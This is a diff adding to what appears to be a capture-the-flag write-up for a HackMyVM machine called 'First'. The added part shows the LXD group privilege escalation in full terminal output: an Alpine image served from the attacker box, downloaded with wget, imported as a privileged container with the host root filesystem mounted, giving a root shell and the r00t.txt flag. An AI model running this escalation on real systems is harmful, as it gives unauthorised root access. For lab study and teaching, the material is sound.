@@ -243,5 +243,57 @@ Resolving deltas: 100% (15/15), done.
 └─$ sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
 ┌──(coolatos㉿CooLaToS)-[~/HMV/First/lxd-alpine-builder]
 └─$ sudo ./build-alpine -a i686
+┌──(coolatos㉿CooLaToS)-[~/HMV/First/lxd-alpine-builder]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+first@first:~$ wget $ip/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2022-08-29 08:01:15--  http://10.1.1.2/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 10.1.1.2:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’
 
+alpine-v3.13-x86_64-20210218_0139.tar.gz                    100%[========================================================================================================================================>]   3.11M  --.-KB/s    in 0.009s  
 
+2022-08-29 08:01:15 (362 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
+
+first@first:~$ lxc image import ./alpine*.tar.gz --alias myimage
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
+first@first:~$ lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]: 
+Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+Name of the new storage pool [default=default]: 
+Name of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]: 
+Create a new ZFS pool? (yes/no) [default=yes]: 
+Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
+Size in GB of the new loop device (1GB minimum) [default=5GB]: 
+Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+What should the new bridge be called? [default=lxdbr0]: 
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
+first@first:~$ lxc init myimage mycontainer -c security.privileged=true
+Creating mycontainer
+first@first:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to mycontainer
+first@first:~$ lxc start mycontainer
+first@first:~$ lxc exec mycontainer /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # cd /root
+~ # ls
+~ # cd /mnt
+/mnt # ls
+root
+/mnt # cd root/
+/mnt/root # ls
+bin         dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr
+boot        etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var
+/mnt/root # cd root/
+/mnt/root/root # ls
+r00t.txt  snap
+/mnt/root/root # 
+```
